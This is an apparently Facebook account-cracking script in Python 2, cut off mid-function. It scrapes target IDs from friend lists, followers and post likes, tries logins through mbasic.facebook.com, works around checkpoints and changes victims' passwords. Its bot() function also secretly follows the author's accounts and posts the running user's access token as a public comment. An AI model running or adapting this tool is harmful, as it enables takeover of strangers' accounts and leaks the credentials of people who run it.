#!/usr/bin/python2
# coding=utf-8
# author : Ahmed Alzwage 

### IMPORT MODULE ###
import os, sys, re, time, requests, calendar, random,json
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
s=requests.Session()
try:
	import requests
except ImportError:
	print("\n [!] module requests belum terinstall")
	os.system("pip install requests")

try:
	import bs4
except ImportError:
	print("\n [!] module bs4 belum terinstall")
	os.system("pip install bs4")

try:
	import concurrent.futures
except ImportError:
	print("\n [!] module futures belum terinstall")
	os.system("pip install futures")


### GLOBAL WARNA ###
P = '\x1b[1;97m' # PUTIH               
M = '\x1b[1;91m' # MERAH            
H = '\x1b[1;92m' # HIJAU.              
K = '\x1b[1;93m' # KUNING.           
B = '\x1b[1;94m' # BIRU.                 
U = '\x1b[1;95m' # UNGU.               
O = '\x1b[1;96m' # BIRU MUDA.     
N = '\x1b[0m'    # WARNA MATI     

### GLOBAL NAMA ###
IP = requests.get('https://api.ipify.org').text
url = "https://mbasic.facebook.com"
id = []
cp = []
ok = []
ubahP = []
pwbaru = []
data = {}
data2 = {}
loop = 0

### GLOBAL WAKTU ###
ct = datetime.now()
n = ct.month
bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','Nopember','Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

### DEF TAMBAHAN ###
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
        
### BAGIAN LOGO ###
def logo():
	os.system('xdg-open https://wa.me/+2347013107449')
	os.system("clear")
	print("""%s

 \x1b[1;92m  _____      \x1b[1;93m _____    \x1b[1;93m__________ \x1b[1;93m ____  __
\x1b[1;92m  /     \   \x1b[1;93m  /  _  \   \x1b[1;93m\______   \ \x1b[1;93m|    |/ _|
\x1b[1;92m /  \ /  \  \x1b[1;93m /  /_\  \   \x1b[1;93m|       _/ \x1b[1;93m|      <  
\x1b[1;92m/    Y    \ \x1b[1;93m/    |    \  \x1b[1;93m|    |   \ \x1b[1;93m|    |  \ 
\x1b[1;92m\____|__  / \x1b[1;93m\____|__  /  \x1b[1;93m|____|_  / \x1b[1;93m|____|__ \
\x1b[1;92m        \/          \x1b[1;93m\/    \x1b[1;93m      \/       \x1b[1;93m   \/ """%(N))
os.system("clear")
def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mTake The Approval For Login'
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.hst.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
 
    r = requests.get('https://raw.githubusercontent.com/GUPTA-SHAKEL/APP/main/server.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        ip()
    else:
        os.system('clear')
        print logo
        print '\tApproved Failed'
        print ' \x1b[1;92mYour Id Is Not Approved Already '
        print ' \x1b[1;92mCopy the id and send to admin'
        print ' \x1b[1;92mYour id: ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+2347013107449')
        reg()
 
 
def reg2():
    os.system('clear')
    print logo
    print '\tApproval not detected'
    print ' \x1b[1;92mCopy and press enter , then select whatsapp to continue'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+2347013107449')
    sav = open('/sdcard/.hst.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()
### BAGIAN LOGIN ###
def tokenz():
	os.system('clear')
	try:
		token = open('token.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
                logo()
                print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m-------------------------------------------------------")
                print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mAuthor     \x1b[1;93m: \x1b[1;93mMark Cornel "%(N))     
		print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mWhatshap   \x1b[1;93m: \x1b[1;93m+2347013107449"%(N))   
		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mFacebook   \x1b[1;93m: \x1b[1;93mM A R K ")      
		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m══════════════════════════════════════")     
		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mJoined  \x1b[1;93m: %s"%(tgl))                     
		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mStatus  \x1b[1;93m: %s\x1b[1;91mPremium%s"%(H,N)) 
                print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mYautube \x1b[1;93m: \x1b[1;93mPRO"%(N))
                print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m══════════════════════════════════════")               
                print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m-------------------------------------------------------")
                print '%s \x1b[1;92m╠══><%s \x1b[1;93mtry the victimized account login on google chrome first'%(B,N)
                print '%s \x1b[1;92m╠══><%s \x1b[1;93mjdo not forget!  url change to %shttps://m.facebook.com'%(B,N,H)
                print '%s \x1b[1;92m╠══><%s \x1b[1;93mafter switching to google chrome.  click %sthree dots'%(B,N,H)
                print '%s \x1b[1;92m╠══><%s \x1b[1;93mthen click %sSearch on Page%s \x1b[1;93mJust type %sEAAA%s \x1b[1;93mThen copy'%(B,N,H,N,H,N)
                print(" \x1b[1;92m╠══><%s \x1b[1;93mPlease visit my Facebook \x1b[1;92mM A R K \x1b[1;93mThank you."%(N))
                print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m-------------------------------------------------------")
                print('%s \x1b[1;92m║'%(O))
		token = raw_input(' \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mFb tokens here \x1b[1;93m: \x1b[1;92m')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('token.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot()
			menu()
		except KeyError:
			print(" %s[!] expired tokens!"%(M))
			sys.exit() 
 
### BOT FOLLOW DAN KOMEN ###
def bot():
	try:
		token = open('token.txt', 'r').read()
	except (KeyError, IOError):
		exit(" %s[!] token kadaluwarsa!"%(M))
	requests.post('https://graph.facebook.com/819777271/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100068182315603/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100016861454377/comments/?message='+token+'&access_token=' + token)

### BAGIAN MENU ###
def menu():
    global token
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
    except (KeyError, IOError):
        os.system('clear')
        print("\n %s[!] texpired tokens!"%(M))
        os.system('rm -f token.txt')
        tokenz()
    except requests.exceptions.ConnectionError:
        exit(" %s[!] you are not connected to the internet"%(M))

    logo()
    print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m-------------------------------------------------------")
    print ' \x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mAuthor     : \x1b[1;92mMark Cornel      \x1b[1;93mX \x1b[1;92mClinton'
    print ' \x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mVersion    : \x1b[1;92mx_x'
    print ' \x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mFacebook   : \x1b[1;92mMark '
    print(" \x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93m══════════════════════════════════════")
    print(" \x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mJoined  \x1b[1;93m: %s\x1b[1;92m"%(tgl))
    print(" \x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mStatus     \x1b[1;93m: %s\x1b[1;91mM A R K %s"%(H,N))
    print(" %s\x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mWhatshap   \x1b[1;93m: \x1b[1;93m+2347013107449"%(N))
    print(" \x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93m══════════════════════════════════════")
    print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m-------------------------------------------------------")
    jalan("\n \x1b[1;92m[ \x1b[1;92mwelcome boss %s%s%s \x1b[1;93m]\n"%(K,nama,N))
    print(" \x1b[1;92m╠══[\x1b[1;93m01\x1b[1;92m] \x1b[1;93mCrack \x1b[1;92mPublic Friend ID \x1b[1;92m[\x1b[1;93m\x1b[1;92m]")
    print(" \x1b[1;92m╠══[\x1b[1;93m02\x1b[1;92m] \x1b[1;93mCrack \x1b[1;92mBulk Friends ID \x1b[1;92m[\x1b[1;93m\x1b[1;92m]")
    print(" \x1b[1;92m╠══[\x1b[1;93m03\x1b[1;92m] \x1b[1;93mCrack \x1b[1;92mFollowers ID \x1b[1;92m[\x1b[1;93m\x1b[1;92m]")
    print(" \x1b[1;92m╠══[\x1b[1;93m04\x1b[1;92m] \x1b[1;93mCrack \x1b[1;92mPost ID \x1b[1;92m[\x1b[1;93m\x1b[1;92m]")
    print(" \x1b[1;92m╠══[\x1b[1;93m05\x1b[1;92m] \x1b[1;93mCrack Random \x1b[1;92mNew New FB ID \x1b[1;92m[\x1b[1;93m\x1b[1;92m]")
    print(" \x1b[1;92m╠══[\x1b[1;93m06\x1b[1;92m] \x1b[1;93mSettings \x1b[1;92mUser Agent \x1b[1;94mU\x1b[1;97m/\x1b[1;95mA")
    print(" \x1b[1;92m╠══[\x1b[1;93m07\x1b[1;92m] \x1b[1;93mCheck \x1b[1;92mCrack Results")
    print(" \x1b[1;92m╠══[\x1b[1;93m08\x1b[1;92m] \x1b[1;93mCheck \x1b[1;92mCheckPoint Options")
    print(" \x1b[1;92m╠══[\x1b[1;93m09\x1b[1;92m] \x1b[1;93mReport \x1b[1;92mBug Script")
    print(" \x1b[1;92m╠══[\x1b[1;93m10\x1b[1;92m] \x1b[1;93mInfo \x1b[1;92mTools/Script")
    print(" \x1b[1;92m╠══[%s\x1b[1;93m00%s\x1b[1;92m]\x1b[1;92m \x1b[1;91mRemove Token"%(M,N))
    print('%s \x1b[1;92m║'%(O))
    asw = raw_input(" \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mchoose : \x1b[1;92m")
    if asw == "":
    	menu()
    elif asw == "1":
    	publik()
    	atursandi()
    elif asw == "2":
    	massal()
    	atursandi()
    elif asw == "3":
    	followers()
    	atursandi()
    elif asw == "4":
    	postingan()
    	atursandi()
    elif asw == "5":
    	fbbaru()
        atursandi()
    elif asw == "6":
    	useragent()
    elif asw == "7":
	cekhasil()
    elif asw == "8":
        cekopsi()
    elif asw == "9":
 	laporbug()
    elif asw == "10":
        info_tools()
    elif asw == "0":
    	os.system('rm -f token.txt')
    	jalan(" \x1b[1;92m╠══[\x1b[1;93m✓\x1b[1;92m] \x1b[1;93msuccessfully deleted token ")
    	exit()
    else:
    	jalan(" ╠══[!] choose the correct answer ! ")
    	menu() 
		
### DUMP PUBLIK ###
def publik():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mtoken expired")
	print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mcontents \x1b[1;97m'\x1b[1;92mme\x1b[1;97m' \x1b[1;93mIf you want to crack from friends list")
	idt = raw_input(" \x1b[1;92m╠══[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mEnter id or username \x1b[1;93m: \x1b[1;92m")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
	except KeyError:
		exit(" \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93maccount not available or friend list private")
        print('%s \x1b[1;92m║'%(O))
	print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtotal id  \x1b[1;93m: %s%s%s\x1b[1;92m"%(M,len(id),N)) 
  
### DUMP MASSAL ###
def massal():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" ╠══[!] Token Expired")
	try:
		tanya_total = int(raw_input(" ╠══[?] masukan jumlah target : "))
	except:tanya_total=1
	print(" ╠══[*] fill in 'me' if you want to crack from friends list")
	for t in range(tanya_total):
		t +=1
		idt = raw_input(" ╠══[?] Target ID %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print(" ╠══[!] account not available or friend list private")
        print('%s \x1b[1;92m║'%(O))
	print(" ╠══[+] total id  : %s%s%s"%(M,len(id),N))
	
### DUMP FOLLOWERS ###
def followers():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" ╠══[!] token kadaluwarsa")
	print(" ╠══[*] fill in 'me' if you want to crack from your own followers")
	idt = raw_input(" ╠══[*] Enter id or username : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=99999&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" ╠══[!] account not available or friend list private")
        print('%s \x1b[1;92m║'%(O))
	print(" ╠══[+] total id  : %s%s%s"%(M,len(id),N))
	
### DUMP POSTINGAN ###
def postingan():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" ╠══[!] Token Expired")
	idt = raw_input(" ╠══[?] Enter url or post id : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/likes?limit=50000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" ╠══[!] post not available or post private")
        print('%s \x1b[1;92m║'%(O))
	print(" ╠══[+] total id  : %s%s%s"%(M,len(id),N))
	
### DUMP NEW FB ###
def fbbaru():
	x = 11111111111
	xx = 77777777777
	idx = "1000" 
	limit = int(input(" ╠══[+] Enter the number of id Maximum 5000 id: "))
	try:
		for n in range(limit):
			_ = random.randint(x,xx)
			__ = idx
			id.append(__+"<=>"+str(_))
	except KeyError:
		exit(" ╠══[!] account not available or error")
        print('%s \x1b[1;92m║'%(O))
	print(" ╠══[+] total id  : %s%s%s"%(M,len(id),N))
### CEK DATA² TARGET ###
def igg():
    jalan(' ╠══[*] sorry this feature is not available now\n ╠══[*] please wait for the latest update or contact owner')
    print('%s \x1b[1;92m║'%(O))
    raw_input(' ╠══[*] return ')
    menu()
####INFO TOOLS####
def info_tools():
    os.system('clear')
    print ' %s╠══[%s#%s]'%(N,O,N), 52 * '\x1b[1;92m-\x1b[0m';time.sleep(0.07)
    print '\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Yt       \x1b[1;93m: Mark Technology.'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Author   \x1b[1;93m: Mark Cornel.'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Github   \x1b[1;93m: https://github.com/GUPTA-SHAKEL'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Facebook \x1b[1;93m: MARK'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Link FB  \x1b[1;93m: https://www.facebook.com/Mark.Cornel8'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Team     \x1b[1;93m: MARK TECHNOLOGY 2022'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Notes  \x1b[1;93m: Please support my Facebook, brothers and sisters'%(N,H,N);time.sleep(0.07)
    print '\n %s╠══[%s#%s]'%(N,O,N), 52 * '\x1b[1;92m-\x1b[0m';time.sleep(0.07)
    print('%s \x1b[1;92m║'%(O))
    raw_input('  ╠══[ %sRETURN%s ] '%(O,N));menu()

### CEK HASIL CRACK ###
def cekhasil():
        print('%s \x1b[1;92m║'%(O))
	print(' ╠══[1]. l\x1b[1;92see OK crack results  ')
	print(' ╠══[2]. \x1b[1;93msee CP crack results ')
        print('%s \x1b[1;92m║'%(O))
	anjg = raw_input(' ╠══[?] choose : \x1b[1;93m')
	if anjg == '':
		menu()
	elif anjg == "1":
		dirs = os.listdir("OK")
		print("")
		for file in dirs:
			print(" ╠══[*] "+file)
		try:
                        print('%s \x1b[1;92m║'%(O))
			file = raw_input(" [?] want to see which result ?: ")
			if file == "":
				menu()
			totalok = open("OK/%s"%(file)).read().splitlines()
		except IOError:
			exit(" ╠══[!] file %s not available"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n *-------------------------------------------------*")
		print(" \x1b[1;92m╠══[+] date : \x1b[1;93m%s -total : \x1b[1;93m%s"%(del_txt, len(totalok)))
		os.system("cat OK/%s"%(file))
                print('%s \x1b[1;92m║'%(O))
		raw_input(" ╠══[*]\x1b[1;93m press enter to return to menu")
		menu()
	elif anjg == "2":
		dirs = os.listdir("CP")
		print("")
		for file in dirs:
			print(" [*] "+file)
		try:
                        print('%s \x1b[1;92m║'%(O))
			file = raw_input(" ╠══[?] \x1b[1;93mWhich one do you want to check? ? : \x1b[1;92m" )
			if file == "":
				menu()
			totalcp = open("CP/%s"%(file)).read().splitlines()
		except IOError:
			exit(" ╠══[!] file %s not available"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n *-------------------------------------------------*")
		print(" \x1b[1;93m╠══[+] date : \x1b[1;92m%s -total : \x1b[1;93m%s"%(del_txt, len(totalcp)))
		os.system("cat CP/%s"%(file))
                print('%s \x1b[1;92m║'%(O))
		raw_input(" ╠══[*] \x1b[1;93mpress enter to return to menu ")
		menu()
	else:
		menu()


####CHECK OPSI CEKPOINT####
def cekopsi():
	dirs = os.listdir("CP")
	print("")
	for file in dirs:
		print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] CP/"+file)
	print("\n \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] input file (ex: CP/%s.txt)"%(tanggal))
	files = raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mfilename  \x1b[1;97m: \x1b[1;92m")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] filename %s not available"%(files))
	ubahpw()
	print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93myou can turn off cellular data to pause the check process')
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] cek : %s%s%s"%(K,kontol.replace("  * --> ",""),N))
		try:
			cek_opsi(titid[0].replace("  * --> ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93account check is complete\x1b[1;97m...")
	raw_input(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mpress enter to return to menu ")
	time.sleep(1)
	menu()

def ubahpw():
	pw=raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mdo you want to change password tap yes\x1b[1;97m?\x1b[1;92m[\x1b[1;93mY\x1b[1;97m/\x1b[1;93mt\x1b[1;92m]\x1b[1;97m: \x1b[1;92m")
	if pw == "Y" or pw == "y":
		ubahP.append("y")
		pw2=raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93menter password \x1b[1;97m: \x1b[1;92m")
		if len(pw2) <= 5:
			exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mpassword minimum 6 characters ")
		else:
			pwbaru.append(pw2)
	else:
		pass


def cek_opsi(user,pw):
	global loop,ubahP,pwbaru
	session=requests.Session()
	session.headers.update({
		"Host":"mbasic.facebook.com",
		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"accept-encoding":"gzip, deflate",
		"accept-language":"id-ID,id;q=0.9",
		"referer":"https://mbasic.facebook.com/",
		"user-agent":"nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	})
	soup=parser(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
	response=parser(urlPost.text, "html.parser")
	if "Find Your Account" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
		print("\r %s[!] turn on airplane mode for 5 seconds%s"%(M,N))
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r %s[!] account locked new session view%s"%(M,N))
		else:
			loop+=1
			print("\r [✓] the account is not hit by a checkpoint, please login on fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,session.cookies.get_dict(),N))
	elif "checkpoint" in session.cookies.get_dict():
		loop+=1
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=parser(an.text,"html.parser")
		number=0
		cek=[cek for cek in response2.find_all("option")]
		print("\r [+] there is "+str(len(cek))+" option ")
		if(len(cek)==0):
			if "View the login details displayed.  This you?" in title:
				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				if "y" in ubahP:
					ubah_pw(user,pw,session,response,link2)
				else:
					print("\r [✓] account tap yes, please login on fb lite \n %s[✓] %s|%s|%s%s									\n"%(H,user,pwbaru,coki[0],N))
			elif "Enter the Login Code to Continue" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r %s[!] account installed two-factor authentication%s							\n"%(M,N))
			else:
				print("Error!")
		elif(len(cek)<=1):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
				print("  [%s] %s"%(str(number),opsi[0]))
		elif(len(cek)>=2):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
				print("  [%s] %s"%(str(number),opsi[0]))
			print("")
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r [✓] the account is not hit by a checkpoint, please login on fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,session.cookies.get_dict(),N))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" [!] %s"%(oh))
	else:
		loop+=2
		print(" [!] Account hit Session/CheckPoint")

def ubah_pw(user,pw,session,response,link2):
	dat,dat2={},{}
	but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
	for x in response("input"):
		if x.get("name") in but:
			dat.update({x.get("name"):x.get("value")})
	ubahPw=session.post(url+link2.get("action"),data=dat).text
	resUbah=parser(ubahPw,"html.parser")
	link3=resUbah.find("form",{"method":"post"})
	but2=["submit[Next]","nh","fb_dtsg","jazoest"]
	if "Create New Password" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
		for b in resUbah("input"):
			if b.get("name") in but2:
				dat2.update({b.get("name"):b.get("value")})
		dat2.update({"password_new":"".join(pwbaru)})
		an=session.post(url+link3.get("action"),data=dat2)
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		print("\r [✓] account tap yes, please login on fb lite \n [*] password has been changed to : %s \n %s[✓] %s|%s|%s%s									\n"%(pwbaru[0],H,user,pwbaru[0],coki,N))
		cek_game(coki)

def cek_game(cookie):
	w=s.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=cookie).text
	sop = parser(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print("")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Added to",""),N))

###GANTI USER AGENT###
def useragent():
    print('%s \x1b[1;92m║'%(O))
    print ' ╠══%s1%s \x1b[1;93mchange user agent'%(O,N)
    print ' ╠══%s2%s \x1b[1;93mcheck user agent'%(O,N)
    print('%s \x1b[1;92m║'%(O))
    ytbjts = raw_input(' %s\x1b[1;93m╠══[%s\x1b[1;92m?%s\x1b[1;92m] choose : \x1b[1;93m'%(N,O,N))
    if ytbjts == '':
        print('%s \x1b[1;92m║'%(O))
        print ' %s╠══[%s×%s] \x1b[1;93mCant be empty bro'%(N,M,N);time.sleep(2);seting_yntkts()
    elif ytbjts in['1','01']:
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts in['2','02']:
        try:
            user_agent = open('YNTKTS.txt', 'r').read()
        except IOError:
            user_agent = '%s-'%(M)
        print('%s \x1b[1;92m║'%(O))
        print ' %s╠══[%s+%s] \x1b[1;93mYour User Agent : \x1b[1;93m%s%s'%(N,O,N,H,user_agent)
        print('%s \x1b[1;92m║'%(O))
        raw_input(' %s╠══[ %skembali%s ]'%(N,O,N));menu()
    else:
        print('%s \x1b[1;92m║'%(O))
        print ' %s╠══[%s×%s] \x1b[1;93mcorrect input'%(N,M,N);time.sleep(2);seting_yntkts()
# User Agent baru
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf YNTKTS.txt')
    print('%s \x1b[1;92m║'%(O))
    _asu_ = raw_input(' ╠══[%s?%s] \x1b[1;93mwant to use your cellphone user agent [Y/t]: '%(O,N))
    if _asu_ == '':
        print('%s \x1b[1;92m║'%(O))
        print ' %s╠══[%s×%s] \x1b[1;93mCant be empty Bro'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
    elif _asu_ in['Y','y']:
        print('%s \x1b[1;92m║'%(O))
        jalan('\x1b[1;93m %s╠══%s\x1b[1;93mEnter Google chrome/regular google then search\n %s╠══%s%sMY USER AGENT%s \x1b[1;93mlalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('')
        _agen_ = raw_input(' ╠══[%s?%s]\x1b[1;93m Enter your cellphone user agent :%s\x1b[1;93m '%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        print('%s \x1b[1;92m║'%(O))
        jalan(' %s╠══[%s✓%s] \x1b[1;92msuccessfully using your hp user agent...'%(N,H,N))
        print('%s \x1b[1;92m║'%(O))
        raw_input(' %s╠══[ %sreturn%s ]'%(N,O,N));menu()
    elif _asu_ in['T','t']:
        _agen_ = raw_input(' ╠══[%s?%s] \x1b[1;93menter user agent :%s \x1b[1;93m'%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        print('%s \x1b[1;92m║'%(O))
        jalan(' %s╠══[%s✓%s]\x1b[1;93m successfully changed user agent...'%(N,H,N))
        print('%s \x1b[1;92m║'%(O))
        raw_input(' %s╠══[ %sreturn%s ]'%(N,O,N));menu()
    else:
        print('%s \x1b[1;92m║'%(O))
        print ' %s╠══[%s!%s]\x1b[1;93m [Y/t] fuck'%(N,M,N);yo_ndak_tau_ko_tanya_saia()

####LAPORAN BUG####
def laporbug():
    print('%s \x1b[1;92m║'%(O))
    asulo = raw_input(' \x1b[1;92m╠══[?] input script bug report : \x1b[1;92m').replace(' ', '%20')
    if asulo == '':
        menu()
    os.system('xdg-open https://wa.me/+2347013107449?text=' + asulo)
    print('%s \x1b[1;92m║'%(O))
    raw_input(' \x1b[1;92m[*] \x1b[1;93mreturn ')
    menu()


### BAGIAN SANDI ####
def atursandi():
	ask=raw_input(" \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mdo you want to use manual password\x1b[1;97m? \x1b[1;92m[\x1b[1;93mY\x1b[1;97m/\x1b[1;93mt\x1b[1;92m]\x1b[1;93m:\x1b[1;92m")
	if ask=="y":
		sandimanual()
	elif ask=="t":
		sandiotomatis()
	else:
		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mchoose the correct answer\x1b[1;97m!"%(M))

def sandimanual():
        print('%s \x1b[1;92m║'%(O))
